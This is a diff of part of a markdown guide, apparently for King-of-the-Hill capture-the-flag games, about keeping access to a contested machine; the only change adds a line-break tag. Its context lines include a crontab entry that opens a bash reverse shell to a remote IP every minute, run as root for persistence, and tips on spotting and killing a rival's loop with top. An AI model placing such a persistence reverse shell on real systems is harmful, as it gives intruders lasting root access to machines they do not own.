@@ -41,7 +41,7 @@ also u can add your username automatically by putting inside /etc/crontab
 and below command can be used to get persistence on the system but run it after getting root access so every minute you can get shell as root in case of someone is trying to kill your terminal else if you do this without getting root you'll get shell as normal user not as root user
 `* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/[IP_ADDR]/4444 0>&1"`
 
-So this one trick is to check, what loop is running if it is not yours then how you can find that loop and kill it
+So this one trick is to check, what loop is running if it is not yours then how you can find that loop and kill it<br>
 <i><b>so for this you can check proccesses running on top in "top" command the running proccesses will be there with their PIDs</b></i>
 
 <i><b>there is another version of htop is also available in our machines that is "htop" but "htop" may not be available on koth machines</b></i>
